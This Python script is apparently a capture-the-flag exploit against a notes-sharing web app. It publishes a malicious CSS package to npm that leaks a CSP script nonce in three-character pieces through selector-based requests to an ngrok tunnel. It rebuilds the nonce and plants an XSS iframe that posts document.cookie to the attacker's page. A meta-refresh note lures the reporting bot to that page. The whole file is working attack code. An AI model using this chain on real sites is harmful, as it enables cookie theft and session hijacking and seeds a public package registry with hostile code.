import itertools
import json
import random
from time import sleep
import httpx
from flask import Flask, request, render_template_string
from pyngrok import ngrok
from multiprocessing import Process
from subprocess import check_output
from packaging import version

URL = "http://localhost:31080"
INTERNAL_URL = "http://localhost"

PROXY: ngrok.NgrokTunnel = ngrok.connect("0.0.0.0:4444", "http")

print("public url:", PROXY.public_url)
with open("index.html", "r") as f:
    INDEX = f.read()

class BaseAPI:
    def __init__(self, url=URL) -> None:
        self.c = httpx.Client(base_url=url)

class API(BaseAPI):
    def login(self, username, password):
        data = {"username": username, "password": password}
        return self.c.post("/login", data=data)

    def write_note(self, title, content):
        data = {"title": title, "content": content}
        return self.c.post("/write", data=data)

    def read_note_by_id(self, note_id):
        return self.c.get(f"/read/{note_id}")

    def share_diary(self, note_id):
        return self.c.get(f"/share_diary/{note_id}")

    def get_shared_notes(self):
        return self.c.get("/share")

    def read_shared_note_by_id(self, note_id, target_username):
        params = {"username": target_username}
        return self.c.get(f"/share/read/{note_id}", params=params)

    def logout(self):
        return self.c.get("/logout")

    def report(self, note_id, target_username):
        params = {"id": note_id, "username": target_username}
        return self.c.get("/report", params=params)

def gen_css():
    result = "script{display:block}"
    charset = "abcdefghijklmnopqrstuvwxyz0123456789"
    perms = list(map("".join, itertools.product(charset, repeat=3)))
    for _, x in enumerate(perms):
        result += f"""script[nonce*="{x}"]{{--{x}: url({PROXY.public_url}/leak?x={x});}}"""
    data = ""
    for x in perms:
        data += f"var(--{x}, none),"
    result += """script{background:%s}""" % data[:-1]
    return result

def publish_mal_css_to_npm():
    repo_name = "css-leak-repo"
    css = gen_css()
    with open(f"./{repo_name}/leak.css", "w") as f:
        f.write(css)
    with open(f"./{repo_name}/package.json", "r") as f:
        pkgjson = json.loads(f.read())
        cur_version = version.parse(pkgjson['version'])
        pkgjson['version'] = f"{cur_version.major}.{cur_version.minor}.{cur_version.micro+1}"
    with open(f"./{repo_name}/package.json", "w") as f:
        json.dump(pkgjson, f)
    check_output(["bash", "-c", "cd css-leak-repo && npm publish"])
    return f"https://unpkg.com/{repo_name}@{pkgjson['version']}/leak.css"

def retrieveNonce(nonce_substr, force=False):
    new_substr = list(nonce_substr)
    if (len(new_substr) != 30 and not force):
        print(f"different length of new_substr [{len(new_substr)}] - aborting")
        return 0
    backup = []
    nonce = ''
    remove_i = 0
    for i in range(len(new_substr)):
        start_i = new_substr[i][0:2]
        left = 0
        for j in range(len(new_substr)):
            end_j = new_substr[j][-2:]
            if i != j:
                if start_i == end_j:
                    left = 1
                    break
        if left == 0:
            # beginning
            remove_i = i
            nonce = new_substr[i]
            break
    if (len(nonce) == 0):
        print("no beginning - aborting")
        return 0
    while (len(nonce) < 32):
        new_substr = new_substr[0:remove_i] + new_substr[remove_i+1:]
        # print("new substr: " + str(new_substr))
        found = []
        for i in range(len(new_substr)):
            start_i = new_substr[i][0:2]
            if (nonce[-2:] == start_i):
                # print("found: " + start_i)
                found += [i]
        if (len(found) == 0):
            # start over from latest backup
            if (len(backup) > 0):
                nonce = backup[-1][0]
                found = backup[-1][1]
                new_substr = backup[-1][2]
                backup = backup[:-1]
            else:
                print("no backup - aborting")
                break
        if (len(found) > 0):
            if (len(found) > 1):
                print("found more than one: " + str(found))
                backup += [[nonce, found[1:], new_substr]]
            remove_i = found[0]
            nonce += new_substr[remove_i][-1]
        print("nonce:", nonce)
    return nonce

PARTIALS_NONCE = []
NONCE = ""
NOTE_COUNTER = 1
can_create = True
mal_css_url = publish_mal_css_to_npm()


def server(api: API, creds):
    app = Flask(__name__)
    print("mal css url:", mal_css_url)
    @app.get("/create_next_note")
    def create_leak_css():
        global PARTIALS_NONCE, NOTE_COUNTER, can_create
        print(f"leak-{NOTE_COUNTER}")
        api.write_note(f"leak-{NOTE_COUNTER}", f'<link rel="stylesheet" href="{mal_css_url}">')
        api.share_diary(NOTE_COUNTER)
        NOTE_COUNTER+=1
        can_create = False
        return str(NOTE_COUNTER-1)
    @app.get("/create_xss")
    async def create_xss():
        global PARTIALS_NONCE, NOTE_COUNTER, can_create
        while (not can_create):
            sleep(1)
        print(f"xss-{NOTE_COUNTER}")
        api.write_note(f"xss-{NOTE_COUNTER}", f"""<iframe srcdoc='<script nonce="{NONCE}">top.opener.postMessage(document.cookie, "*")</script>'>""")
        api.share_diary(NOTE_COUNTER)
        NOTE_COUNTER+=1
        can_create = False
        return str(NOTE_COUNTER-1)
    @app.get("/")
    async def home():
        return render_template_string(INDEX, **{
            "target": INTERNAL_URL,
            "username": creds
        })

    @app.get("/leak")
    async def leak():
        global PARTIALS_NONCE, NONCE, can_create
        part = request.args.get("x")
        PARTIALS_NONCE.append(part)
        if (len(PARTIALS_NONCE) == 32-2):
            print("Success gather all 30 pieces:", PARTIALS_NONCE)
            NONCE = retrieveNonce(PARTIALS_NONCE)
            can_create = True
        return ""
    app.run("0.0.0.0", 4444)


if __name__ == "__main__":
    api = API()
    creds = "sld"+random.randbytes(3).hex()
    print("credential", creds)
    api.login(creds, creds)
    proc = Process(target=server, args=(api,creds))
    proc.start()
    api.write_note("redirect", '<meta http-equiv="refresh" content="0; url='+PROXY.public_url+'">')
    api.share_diary(NOTE_COUNTER-1)
    api.report(NOTE_COUNTER-1, creds)
